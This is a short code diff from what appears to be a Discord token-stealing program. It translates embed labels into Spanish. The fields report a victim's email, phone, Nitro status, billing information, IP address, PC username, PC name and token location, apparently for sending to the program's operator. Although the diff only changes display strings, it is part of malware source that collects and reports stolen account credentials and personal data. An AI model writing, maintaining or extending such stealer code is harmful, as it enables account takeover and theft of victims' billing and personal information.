@@ -120,12 +120,12 @@ def main():
                 "fields": [
                     {
                         "name": "**Informacion de la Cuenta**",
-                        "value": f'Email: {email}\\Telefono: {phone}\\Nitro: {nitro}\\Billing Info: {billing}',
+                        "value": f'Email: {email}\\Telefono: {phone}\\Nitro: {nitro}\\Información de Facturación: {billing}',
                         "inline": True
                     },
                     {
-                        "name": "**PC Info**",
-                        "value": f'IP: {ip}\\nUsername: {pc_username}\\Nombre de la PC: {pc_name}\\Token Location: {platform}',
+                        "name": "**Informacion de la PC**",
+                        "value": f'IP: {ip}\\Nombre de Usuario: {pc_username}\\Nombre de la PC: {pc_name}\\Ubicacion de la Token: {platform}',
                         "inline": True
                     },
                     {
